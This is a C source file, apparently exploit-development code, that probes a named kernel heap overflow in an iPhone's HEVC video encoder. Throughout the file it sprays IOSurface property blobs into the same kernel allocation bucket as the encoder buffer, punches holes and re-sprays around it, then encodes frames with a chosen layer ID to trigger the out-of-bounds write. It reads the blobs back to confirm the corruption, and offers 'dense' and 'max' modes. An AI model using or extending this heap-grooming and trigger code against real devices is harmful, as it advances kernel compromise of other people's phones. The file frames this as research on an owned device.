/*
 * ave_iosurface_spray.c — CVE-2026-114025 IOSurface Heap Spray Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Sprays kalloc.49152 with IOSurface property blobs (36864 bytes each,
 * matching the HEVC buffer size 0x9000) to position known data adjacent
 * to the HEVC encoder buffer. When counter OOB crosses the buffer boundary
 * (entry 802, ~267 encodes), it corrupts an adjacent allocation — if that
 * allocation is one of our spray surfaces, we detect corruption via readback.
 *
 * kalloc_data has no typed isolation for the 32769-49152 range, so both
 * HEVC buffers and IOSurface property data CFData backing stores land in
 * the same kalloc.49152 bucket.
 *
 * Cross-buffer OOB entry format (16 bytes each):
 *   [NAL_type(4), layer_id(4), cumsum(4), data>>3(4)]
 *   layer_id at bytes 4-7 is fully controlled (0-65535)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOSurface -framework IOKit
 *        -o AVEIOSurfSpray ave_iosurface_spray.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.aveiosurfspray
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <IOSurface/IOSurface.h>

#define HEVC_BUF_SIZE   36864   /* 0x9000 — HEVC buffer allocation size */
#define SPRAY_DEFAULT   64      /* default number of spray surfaces */
#define ENCODE_DEFAULT  300     /* default encodes for cross-buffer OOB */
#define SPRAY_KEY       CFSTR("spray_data")

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;
static volatile int g_cb_status = -999;
static volatile int g_cb_count = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = (int)status;
    g_cb_count++;
    g_encode_done = 1;
}

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

/*
 * Create a minimal IOSurface and attach a property blob of exactly
 * HEVC_BUF_SIZE bytes. The blob is filled with a per-surface marker
 * pattern so corruption is detectable on readback.
 *
 * Pattern: first 8 bytes = magic (0xSPRAY000 + index), rest = 0xAA
 * with 4-byte surface index stamped every 4096 bytes.
 */
static IOSurfaceRef create_spray_surface(int idx) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    int w = 4, h = 4, bpr = w * 4, alloc_size = bpr * h;
    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_size);
    int pf = (int)'BGRA';
    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);

    CFDictionarySetValue(props, kIOSurfaceWidth, wn);
    CFDictionarySetValue(props, kIOSurfaceHeight, hn);
    CFDictionarySetValue(props, kIOSurfaceBytesPerRow, bn);
    CFDictionarySetValue(props, kIOSurfaceAllocSize, an);
    CFDictionarySetValue(props, kIOSurfacePixelFormat, pfn);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(props);
    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(an); CFRelease(pfn);

    if (!surf) return NULL;

    /* Build the spray blob */
    uint8_t *blob = (uint8_t *)malloc(HEVC_BUF_SIZE);
    if (!blob) { CFRelease(surf); return NULL; }

    memset(blob, 0xAA, HEVC_BUF_SIZE);

    /* Magic header: 0x53505259 ("SPRY") + index as uint32 */
    uint32_t magic = 0x53505259;
    uint32_t idx32 = (uint32_t)idx;
    memcpy(blob, &magic, 4);
    memcpy(blob + 4, &idx32, 4);

    /* Stamp index every 4096 bytes for fine-grained corruption detection */
    for (int off = 4096; off + 4 <= HEVC_BUF_SIZE; off += 4096) {
        uint32_t marker = (uint32_t)((idx << 16) | (off >> 12));
        memcpy(blob + off, &marker, 4);
    }

    CFDataRef cfdata = CFDataCreate(NULL, blob, HEVC_BUF_SIZE);
    free(blob);

    if (cfdata) {
        IOSurfaceSetValue(surf, SPRAY_KEY, cfdata);
        CFRelease(cfdata);
    }

    return surf;
}

/*
 * Check a spray surface for corruption. Returns the number of corrupted
 * marker positions found, or -1 if the property is missing entirely.
 */
static int check_surface(IOSurfaceRef surf, int idx) {
    CFTypeRef val = IOSurfaceCopyValue(surf, SPRAY_KEY);
    if (!val) return -1;

    if (CFGetTypeID(val) != CFDataGetTypeID()) {
        CFRelease(val);
        return -1;
    }

    CFDataRef data = (CFDataRef)val;
    CFIndex len = CFDataGetLength(data);
    const uint8_t *bytes = CFDataGetBytePtr(data);

    if (len != HEVC_BUF_SIZE) {
        rlog("  [%d] SIZE MISMATCH: expected %d, got %ld\n", idx, HEVC_BUF_SIZE, (long)len);
        CFRelease(val);
        return -1;
    }

    int corrupted = 0;

    /* Check magic header */
    uint32_t magic = 0, stored_idx = 0;
    memcpy(&magic, bytes, 4);
    memcpy(&stored_idx, bytes + 4, 4);

    if (magic != 0x53505259) {
        rlog("  [%d] MAGIC CORRUPTED: expected 0x53505259, got 0x%08x\n", idx, magic);
        corrupted++;
    }
    if (stored_idx != (uint32_t)idx) {
        rlog("  [%d] INDEX CORRUPTED: expected %d, got %u\n", idx, idx, stored_idx);
        corrupted++;
    }

    /* Check markers every 4096 bytes */
    for (int off = 4096; off + 4 <= HEVC_BUF_SIZE; off += 4096) {
        uint32_t expected = (uint32_t)((idx << 16) | (off >> 12));
        uint32_t actual = 0;
        memcpy(&actual, bytes + off, 4);
        if (actual != expected) {
            rlog("  [%d] MARKER CORRUPTED at +0x%x: expected 0x%08x, got 0x%08x\n",
                 idx, off, expected, actual);
            corrupted++;
        }
    }

    /* Check a sample of 0xAA fill bytes (every 256 bytes in between markers) */
    for (int off = 8; off < HEVC_BUF_SIZE; off += 256) {
        /* Skip marker positions */
        if (off < 8) continue;
        int is_marker = 0;
        for (int m = 4096; m + 4 <= HEVC_BUF_SIZE; m += 4096) {
            if (off >= m && off < m + 4) { is_marker = 1; break; }
        }
        if (is_marker) continue;

        if (bytes[off] != 0xAA) {
            rlog("  [%d] FILL CORRUPTED at +0x%x: expected 0xAA, got 0x%02x\n",
                 idx, off, bytes[off]);
            corrupted++;
            if (corrupted > 20) {
                rlog("  [%d] ... (stopping after 20 corruptions)\n", idx);
                break;
            }
        }
    }

    CFRelease(val);
    return corrupted;
}

static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("ENCODER CREATE FAILED: %d\n", (int)st);
        return NULL;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    int base = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        rlog("ENCODER PREPARE FAILED: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int run_encodes(VTCompressionSessionRef session, int n, int w, int h) {
    int errors = 0;
    for (int i = 0; i < n; i++) {
        CVPixelBufferRef pb = create_pb(w, h);
        if (!pb) { errors++; continue; }

        g_encode_done = 0;
        g_cb_status = -999;
        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);

        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        if (st != noErr) {
            CVPixelBufferRelease(pb);
            errors++;
            if (errors >= 5) break;
            continue;
        }

        for (int j = 0; j < 100 && !g_encode_done; j++) usleep(10000);

        if (g_cb_status != 0 && g_cb_status != -999) errors++;
        CVPixelBufferRelease(pb);

        if ((i + 1) % 50 == 0)
            rlog("  [encode %d/%d] %d errors, cb_count=%d\n", i + 1, n, errors, g_cb_count);
    }

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    usleep(500000);
    return errors;
}

/* ---- Modes ---- */

static void mode_readback(int n_surfaces) {
    rlog("\n=== READBACK: Verify IOSurface property set/get works ===\n");
    rlog("Creating %d surfaces with %d-byte property blobs\n\n", n_surfaces, HEVC_BUF_SIZE);

    IOSurfaceRef *surfs = (IOSurfaceRef *)calloc(n_surfaces, sizeof(IOSurfaceRef));
    int created = 0;

    for (int i = 0; i < n_surfaces; i++) {
        surfs[i] = create_spray_surface(i);
        if (surfs[i]) {
            created++;
        } else {
            rlog("  [%d] CREATE FAILED\n", i);
        }
    }
    rlog("Created %d/%d spray surfaces\n\n", created, n_surfaces);

    rlog("Reading back all properties...\n");
    int ok = 0, corrupt = 0, missing = 0;
    for (int i = 0; i < n_surfaces; i++) {
        if (!surfs[i]) { missing++; continue; }
        int c = check_surface(surfs[i], i);
        if (c < 0) { missing++; rlog("  [%d] MISSING\n", i); }
        else if (c == 0) ok++;
        else { corrupt++; rlog("  [%d] %d corruptions\n", i, c); }
    }

    rlog("\nResults: %d ok, %d corrupted, %d missing\n", ok, corrupt, missing);
    rlog("IOSurface property readback %s\n", (ok == created) ? "WORKS" : "HAS ISSUES");

    for (int i = 0; i < n_surfaces; i++)
        if (surfs[i]) CFRelease(surfs[i]);
    free(surfs);
}

static void mode_spray(int n_surfaces) {
    rlog("\n=== SPRAY: Allocate %d x %d-byte blobs in kalloc.49152 ===\n",
         n_surfaces, HEVC_BUF_SIZE);
    rlog("Goal: fill kalloc.49152 so HEVC buffer lands adjacent to spray\n\n");

    IOSurfaceRef *surfs = (IOSurfaceRef *)calloc(n_surfaces, sizeof(IOSurfaceRef));
    int created = 0;

    for (int i = 0; i < n_surfaces; i++) {
        surfs[i] = create_spray_surface(i);
        if (surfs[i]) created++;
    }
    rlog("Created %d/%d spray surfaces\n", created, n_surfaces);

    rlog("Holding for 5 seconds (surfaces pinned in kalloc.49152)...\n");
    sleep(5);

    rlog("Verifying integrity before release...\n");
    int ok = 0;
    for (int i = 0; i < n_surfaces; i++) {
        if (!surfs[i]) continue;
        int c = check_surface(surfs[i], i);
        if (c == 0) ok++;
    }
    rlog("Integrity: %d/%d clean\n", ok, created);

    for (int i = 0; i < n_surfaces; i++)
        if (surfs[i]) CFRelease(surfs[i]);
    free(surfs);
}

static void mode_spray_and_encode(int n_surfaces, int n_encodes, int layer_id) {
    rlog("\n=== SPRAY+ENCODE: %d surfaces, %d encodes, lid=%d (0x%x) ===\n",
         n_surfaces, n_encodes, layer_id, layer_id);
    rlog("Cross-buffer OOB starts at entry 802 (~267 encodes)\n");
    rlog("Each OOB entry writes layer_id=0x%04x at bytes 4-7\n\n", layer_id);

    /* Phase 1: Pre-spray to fill kalloc.49152 freelist */
    rlog("Phase 1: Pre-spray (filling freelist)...\n");
    int pre_count = n_surfaces / 2;
    IOSurfaceRef *pre_surfs = (IOSurfaceRef *)calloc(pre_count, sizeof(IOSurfaceRef));
    int pre_created = 0;
    for (int i = 0; i < pre_count; i++) {
        pre_surfs[i] = create_spray_surface(1000 + i);
        if (pre_surfs[i]) pre_created++;
    }
    rlog("  Pre-spray: %d/%d created\n", pre_created, pre_count);

    /* Phase 2: Create encoder (allocates HEVC buffer in kalloc.49152) */
    rlog("\nPhase 2: Creating MV-HEVC encoder (allocates 0x9000 HEVC buffer)...\n");
    VTCompressionSessionRef encoder = create_mvhevc_encoder(128, 128, layer_id);
    if (!encoder) {
        rlog("ENCODER FAILED — aborting\n");
        for (int i = 0; i < pre_count; i++)
            if (pre_surfs[i]) CFRelease(pre_surfs[i]);
        free(pre_surfs);
        return;
    }
    rlog("  Encoder created (HEVC buffer now in kalloc.49152)\n");

    /* Phase 3: Post-spray to surround HEVC buffer */
    rlog("\nPhase 3: Post-spray (surrounding HEVC buffer)...\n");
    int post_count = n_surfaces - pre_count;
    IOSurfaceRef *post_surfs = (IOSurfaceRef *)calloc(post_count, sizeof(IOSurfaceRef));
    int post_created = 0;
    for (int i = 0; i < post_count; i++) {
        post_surfs[i] = create_spray_surface(2000 + i);
        if (post_surfs[i]) post_created++;
    }
    rlog("  Post-spray: %d/%d created\n", post_created, post_count);

    /* Phase 4: Free pre-spray to create holes, then re-spray */
    rlog("\nPhase 4: Poke holes and re-spray...\n");
    for (int i = 0; i < pre_count; i += 2) {
        if (pre_surfs[i]) { CFRelease(pre_surfs[i]); pre_surfs[i] = NULL; }
    }
    int refill = 0;
    for (int i = 0; i < pre_count; i += 2) {
        pre_surfs[i] = create_spray_surface(3000 + i);
        if (pre_surfs[i]) refill++;
    }
    rlog("  Re-sprayed %d holes\n", refill);

    /* Phase 5: Encode past cross-buffer boundary */
    rlog("\nPhase 5: Encoding %d frames (cross-buffer OOB at ~267)...\n", n_encodes);
    g_cb_count = 0;
    int errors = run_encodes(encoder, n_encodes, 128, 128);
    rlog("  Encode complete: %d errors, %d callbacks\n", errors, g_cb_count);

    /* Phase 6: Check ALL spray surfaces for corruption */
    rlog("\nPhase 6: Checking all spray surfaces for corruption...\n");
    int total_ok = 0, total_corrupt = 0, total_missing = 0;

    rlog("  Pre-spray surfaces:\n");
    for (int i = 0; i < pre_count; i++) {
        if (!pre_surfs[i]) continue;
        int idx = (i % 2 == 0) ? 3000 + i : 1000 + i;
        int c = check_surface(pre_surfs[i], idx);
        if (c < 0) total_missing++;
        else if (c == 0) total_ok++;
        else {
            total_corrupt++;
            rlog("    *** PRE-SPRAY [%d] CORRUPTED: %d markers damaged ***\n", i, c);
        }
    }

    rlog("  Post-spray surfaces:\n");
    for (int i = 0; i < post_count; i++) {
        if (!post_surfs[i]) continue;
        int c = check_surface(post_surfs[i], 2000 + i);
        if (c < 0) total_missing++;
        else if (c == 0) total_ok++;
        else {
            total_corrupt++;
            rlog("    *** POST-SPRAY [%d] CORRUPTED: %d markers damaged ***\n", i, c);
        }
    }

    rlog("\n========================================\n");
    rlog("RESULTS: %d ok, %d CORRUPTED, %d missing\n", total_ok, total_corrupt, total_missing);
    if (total_corrupt > 0) {
        rlog("*** CROSS-BUFFER OOB CORRUPTION DETECTED ***\n");
        rlog("*** IOSurface property data was modified by HEVC counter overflow ***\n");
        rlog("*** This confirms: kernel heap corruption via CVE-2026-114025 ***\n");
    } else {
        rlog("No corruption detected in this run.\n");
        rlog("Try: more surfaces (increase spray density), different timing,\n");
        rlog("     or more encodes to push further past boundary.\n");
    }
    rlog("========================================\n");

    /* Cleanup */
    VTCompressionSessionInvalidate(encoder);
    CFRelease(encoder);
    for (int i = 0; i < pre_count; i++)
        if (pre_surfs[i]) CFRelease(pre_surfs[i]);
    for (int i = 0; i < post_count; i++)
        if (post_surfs[i]) CFRelease(post_surfs[i]);
    free(pre_surfs);
    free(post_surfs);
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_iosurf_spray.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 IOSurface Heap Spray Probe ===\n");
    rlog("Target: detect cross-buffer OOB corruption via IOSurface readback\n");
    rlog("HEVC buffer size: 0x%x (%d) — lands in kalloc.49152\n",
         HEVC_BUF_SIZE, HEVC_BUF_SIZE);
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "help";

    if (strcmp(mode, "readback") == 0) {
        int n = (argc > 2) ? atoi(argv[2]) : 16;
        if (n < 1) n = 1; if (n > 256) n = 256;
        mode_readback(n);

    } else if (strcmp(mode, "spray") == 0) {
        int n = (argc > 2) ? atoi(argv[2]) : SPRAY_DEFAULT;
        if (n < 1) n = 1; if (n > 256) n = 256;
        mode_spray(n);

    } else if (strcmp(mode, "spray_and_encode") == 0) {
        int ns = (argc > 2) ? atoi(argv[2]) : SPRAY_DEFAULT;
        int ne = (argc > 3) ? atoi(argv[3]) : ENCODE_DEFAULT;
        int lid = (argc > 4) ? (int)strtol(argv[4], NULL, 0) : 0xDEAD;
        if (ns < 4) ns = 4; if (ns > 256) ns = 256;
        if (ne < 100) ne = 100; if (ne > 1000) ne = 1000;
        mode_spray_and_encode(ns, ne, lid);

    } else if (strcmp(mode, "dense") == 0) {
        rlog("DENSE: 128 surfaces, 400 encodes, lid=0xCAFE\n");
        mode_spray_and_encode(128, 400, 0xCAFE);

    } else if (strcmp(mode, "max") == 0) {
        rlog("MAX: 256 surfaces, 500 encodes, lid=0xBEEF\n");
        mode_spray_and_encode(256, 500, 0xBEEF);

    } else {
        rlog("Usage: AVEIOSurfSpray <mode> [args...]\n\n");
        rlog("Modes:\n");
        rlog("  readback [n]                     -- create n surfaces, verify readback works\n");
        rlog("  spray [n]                        -- allocate n blobs in kalloc.49152, hold 5s\n");
        rlog("  spray_and_encode [n] [enc] [lid] -- spray n, encode enc frames, check for corruption\n");
        rlog("  dense                            -- 128 surfaces, 400 encodes, lid=0xCAFE\n");
        rlog("  max                              -- 256 surfaces, 500 encodes, lid=0xBEEF\n");
        rlog("\nDefaults: n=%d, enc=%d, lid=0xDEAD\n", SPRAY_DEFAULT, ENCODE_DEFAULT);
        rlog("\nKey thresholds:\n");
        rlog("  86 encodes:  258 entries, first sub-object OOB (intra-buffer)\n");
        rlog("  267 encodes: 802 entries, cross-buffer OOB starts\n");
        rlog("  300 encodes: ~100 OOB entries into adjacent allocation\n");
        rlog("  500 encodes: ~700 OOB entries, deep cross-buffer corruption\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
